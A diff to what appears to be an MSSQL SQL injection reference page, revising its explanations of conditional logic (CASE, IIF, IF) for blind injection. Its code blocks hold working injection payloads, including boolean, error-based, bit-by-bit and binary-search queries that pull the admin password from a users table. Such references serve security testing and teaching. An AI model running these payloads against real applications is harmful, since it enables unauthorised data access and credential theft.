@@ -4,7 +4,7 @@ description: Using conditional logic in MSSQL for advanced injection techniques
 category: Injection Techniques
 order: 10
 tags: ["conditional logic", "case", "if", "blind injection"]
-lastUpdated: 2025-03-15
+lastUpdated: 2026-10-08
 ---
 
 Conditional statements are essential for blind SQL injection techniques and allow attackers to extract information by analyzing the application's response to different conditions. Microsoft SQL Server provides several methods for implementing conditional logic.
@@ -69,8 +69,8 @@ Example:
 ```sql
 SELECT username,
   CASE
-    WHEN admin = 1 THEN 'Administrator'
-    WHEN moderator = 1 THEN 'Moderator'
+    WHEN role = 'admin' THEN 'Administrator'
+    WHEN role = 'moderator' THEN 'Moderator'
     ELSE 'Regular User'
   END AS user_role
 FROM users
@@ -87,7 +87,7 @@ IIF(condition, true_value, false_value)
 Example:
 
 ```sql
-SELECT username, IIF(admin = 1, 'Administrator', 'Regular User') AS user_role
+SELECT username, IIF(role = 'admin', 'Administrator', 'Regular User') AS user_role
 FROM users
 ```
 
@@ -95,19 +95,19 @@ FROM users
 
 ### Boolean-Based Blind Injection
 
-Conditional statements are the foundation of boolean-based blind injection:
+Conditional statements are the foundation of boolean-based blind injection. The payloads in this article target a string parameter (`'`) and start with a value that matches a row (`admin`): after a value that matches nothing, the true and false conditions both return no rows and the condition may never be evaluated. For a numeric parameter, use an existing ID instead (`1 AND ...`):
 
 ```sql
 -- Determine if 'admin' user exists
-' AND (SELECT COUNT(*) FROM users WHERE username = 'admin') > 0--
+admin' AND (SELECT COUNT(*) FROM users WHERE username = 'admin') > 0--
 
 -- Extract data character by character
-' AND ASCII(SUBSTRING((SELECT TOP 1 password FROM users WHERE username = 'admin'), 1, 1)) = 65--
+admin' AND ASCII(SUBSTRING((SELECT TOP 1 password FROM users WHERE username = 'admin'), 1, 1)) = 65--
 ```
 
 ### Time-Based Blind Injection
 
-Combining conditional logic with time delays:
+Combining conditional logic with time delays. `IF` and `WAITFOR` are statements, not expressions, so these payloads are stacked queries: they start a second statement after the closed string (the `;` is optional in T-SQL) and only work where the driver accepts batches (see [Stacked Queries](/mssql/stacked-queries)):
 
 ```sql
 -- Delay execution if condition is true
@@ -138,19 +138,19 @@ SELECT
   CASE
     WHEN (SELECT COUNT(*) FROM users) > 0 THEN
       CASE
-        WHEN (SELECT COUNT(*) FROM users WHERE admin = 1) > 0 THEN 'Admin users exist'
+        WHEN (SELECT COUNT(*) FROM users WHERE role = 'admin') > 0 THEN 'Admin users exist'
         ELSE 'No admin users'
       END
     ELSE 'No users at all'
   END
 ```
 
-### Using UPDATE with Conditions
+### Variable Assignment with a WHERE Clause
 
 ```sql
--- Using UPDATE with WHERE clause to implement conditional logic
+-- SELECT assigns the variable only when the WHERE clause is true
 DECLARE @result int = 0
-UPDATE @result SET @result = 1 WHERE (SELECT COUNT(*) FROM users WHERE username = 'admin') > 0
+SELECT @result = 1 WHERE (SELECT COUNT(*) FROM users WHERE username = 'admin') > 0
 SELECT @result
 ```
 
@@ -159,8 +159,8 @@ SELECT @result
 Using conditional logic to force errors that contain data:
 
 ```sql
--- Using CASE to force a conversion error
-' AND 1=CONVERT(int,
+-- Using CASE to force a conversion error; the message contains 'Yes' or 'No'
+admin' AND 1=CONVERT(int,
     CASE
       WHEN (SELECT COUNT(*) FROM users WHERE username = 'admin') > 0 THEN 'Yes'
       ELSE 'No'
@@ -174,18 +174,18 @@ Using conditional logic to force errors that contain data:
 
 ```sql
 -- Check if a table exists
-' AND (SELECT CASE WHEN EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name = 'users') THEN 1 ELSE 0 END) = 1--
+admin' AND (SELECT CASE WHEN EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name = 'users') THEN 1 ELSE 0 END) = 1--
 ```
 
 ### Extracting Data Bit by Bit
 
 ```sql
--- Extract one character at a time
-' AND (SELECT ASCII(SUBSTRING(
+-- Test one bit of the first character (& is bitwise AND)
+admin' AND (SELECT ASCII(SUBSTRING(
     (SELECT TOP 1 password FROM users WHERE username = 'admin'),
     1, 1)) & 1) = 1--
 
-' AND (SELECT ASCII(SUBSTRING(
+admin' AND (SELECT ASCII(SUBSTRING(
     (SELECT TOP 1 password FROM users WHERE username = 'admin'),
     1, 1)) & 2) = 2--
 
@@ -195,10 +195,8 @@ Using conditional logic to force errors that contain data:
 ### Conditional Logic with Binary Search
 
 ```sql
--- Binary search approach to extract values efficiently
-' AND (SELECT ASCII(SUBSTRING(
-    (SELECT TOP 1 password FROM users WHERE username = 'admin'),
-    1, 1)) < 128)--
+-- Binary search: halve the range with each request (< 128, < 64, ...)
+admin' AND ASCII(SUBSTRING((SELECT TOP 1 password FROM users WHERE username = 'admin'), 1, 1)) < 128--
 ```
 
 ## Handling NULL Values
@@ -207,10 +205,10 @@ NULL handling is important in conditional logic:
 
 ```sql
 -- Using ISNULL for NULL handling
-' AND ISNULL((SELECT TOP 1 username FROM users WHERE email LIKE '%admin%'), '') = 'admin'--
+admin' AND ISNULL((SELECT TOP 1 username FROM users WHERE email LIKE '%admin%'), '') = 'admin'--
 
--- Using COALESCE for multiple potential NULL values
-' AND COALESCE((SELECT TOP 1 username FROM users WHERE email LIKE '%admin%'), '', 'unknown') = 'admin'--
+-- Using COALESCE to fall back through several expressions that may be NULL
+admin' AND COALESCE((SELECT TOP 1 username FROM users WHERE email LIKE '%admin%'), (SELECT TOP 1 username FROM users WHERE role = 'admin'), '') = 'admin'--
 ```
 
 ## Limitations and Considerations
